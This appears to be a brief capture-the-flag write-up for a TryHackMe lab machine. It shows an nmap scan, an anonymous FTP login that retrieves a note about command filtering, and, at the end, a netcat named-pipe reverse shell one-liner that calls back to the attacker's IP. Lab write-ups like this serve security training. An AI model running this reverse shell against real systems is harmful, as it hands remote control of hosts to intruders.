# ChillHack.thm

```jsx
$ nmap -T5 -sC -sV -Pn 10.65.143.39                                               14:07:36 [141/141]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-22 14:07 CET                                   
Warning: 10.65.143.39 giving up on port because retransmission cap hit (2).                          
Nmap scan report for 10.65.143.39                                                                    
Host is up (0.17s latency).                                                                          
Not shown: 811 closed tcp ports (conn-refused), 186 filtered tcp ports (no-response)                 
PORT   STATE SERVICE VERSION                                                                         
21/tcp open  ftp     vsftpd 3.0.5                                                                    
| ftp-syst:                                                                                          
|   STAT:                                                                                            
| FTP server status:                                                                                 
|      Connected to ::ffff:192.168.152.201                                                           
|      Logged in as ftp                                                                              
|      TYPE: ASCII                                                                                   
|      No session bandwidth limit                                                                    
|      Session timeout in seconds is 300                                                             
|      Control connection is plain text                                                              
|      Data connections will be plain text                                                           
|      At session startup, client count was 3                                                        
|      vsFTPd 3.0.5 - secure, fast, stable                                                           
|_End of status                                                                                      
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                               
|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt                                   
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)                   
| ssh-hostkey:                                                                                       
|   3072 53:25:f4:b3:8d:9a:97:7a:8f:37:37:44:b1:56:8b:8a (RSA)                                       
|   256 8c:ef:94:0c:ea:8d:05:b4:d9:7d:03:7e:61:8e:c6:12 (ECDSA)                                      
|_  256 ff:77:0f:e0:99:93:f9:ec:40:54:98:a2:e2:d0:b1:51 (ED25519)                                    
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))                                                  
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                         
|_http-title: Game Info                                                                              
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  
```

```jsx
$ ftp anonymous@10.65.143.39                                                                        
Connected to 10.65.143.39.                                                                           
220 (vsFTPd 3.0.5)       
331 Please specify the password.                  
Password:                
230 Login successful.                             
Remote system type is UNIX.                       
Using binary mode to transfer files.              
ftp> ls                  
229 Entering Extended Passive Mode (|||58689|)                                                       
150 Here comes the directory listing.             
-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt    

$ cat note.txt
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

```jsx
rm -f /tmp/p
mkfifo /tmp/p
cat /tmp/p | /bin/sh 2>&1 | nc 192.168.152.201 9999 > /tmp/p

```